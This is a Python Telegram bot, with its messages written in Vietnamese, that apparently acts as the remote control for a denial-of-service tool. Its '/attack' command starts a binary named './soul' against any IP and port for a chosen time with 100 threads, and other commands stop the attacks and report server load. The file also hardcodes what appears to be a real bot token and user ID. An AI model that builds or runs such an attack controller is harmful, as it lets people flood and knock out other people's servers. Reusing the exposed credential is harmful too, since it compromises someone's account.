import telebot
import subprocess
import threading
import psutil
import os
import time

TOKEN = "7656031517:AAFSYcm8x17xafPqA1d9Gl0u-znGVnjkkFU"
USER_ID = 7088683094
bot = telebot.TeleBot(TOKEN)
running_attacks = {}
THREADS = 100  # Số threads cố định

def monitor_process(pid):
    try:
        process = psutil.Process(pid)
        process.wait()  # Chờ tiến trình kết thúc
        running_attacks.pop(pid, None)
    except psutil.NoSuchProcess:
        pass

@bot.message_handler(commands=['attack'])
def run_command(message):
    args = message.text.split()
    if len(args) != 3 or ':' not in args[1]:
        bot.send_message(USER_ID, "❌ Hãy nhập đúng định dạng: /attack <IP>:<Port> <Time>")
        return
    
    ip_port, duration = args[1], args[2]
    ip, port = ip_port.split(':')
    try:
        process = subprocess.Popen(["./soul", ip, port, duration, str(THREADS)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_attacks[process.pid] = process
        threading.Thread(target=monitor_process, args=(process.pid,)).start()
        bot.send_message(USER_ID, f"🚀 **Tấn công đã bắt đầu!**\n🔹 IP: `{ip}`\n🔹 Port: `{port}`\n🔹 Thời gian: `{duration}` giây\n🔹 Luồng: `{THREADS}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(USER_ID, f"❌ Lỗi khi chạy attack: {str(e)}")

@bot.message_handler(commands=['stop_all'])
def stop_all_attacks(message):
    if not running_attacks:
        bot.send_message(USER_ID, "✅ Không có cuộc tấn công nào đang chạy.")
        return
    
    for pid in list(running_attacks.keys()):
        try:
            parent = psutil.Process(pid)
            for child in parent.children(recursive=True):
                child.kill()
            parent.kill()
            running_attacks.pop(pid, None)
        except psutil.NoSuchProcess:
            pass
    
    subprocess.run("pkill -f './soul'", shell=True)  # Chỉ dừng tool, không dừng bot
    bot.send_message(USER_ID, "🛑 **Tất cả các cuộc tấn công đã bị dừng!**", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    uptime = time.time() - psutil.boot_time()
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
    bot_status = "✅ Đang chạy"
    
    status_message = (f"📊 **Trạng thái hệ thống**\n"
                      f"🔹 CPU: {cpu_usage}%\n"
                      f"🔹 RAM: {ram_usage}%\n"
                      f"🔹 Uptime: {uptime_str}\n"
                      f"🤖 Bot: {bot_status}")
    bot.send_message(USER_ID, status_message)

def main():
    bot.send_message(USER_ID, "🤖 **Bot đã khởi động!**")
    bot.polling()

while True:
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Lỗi xảy ra: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
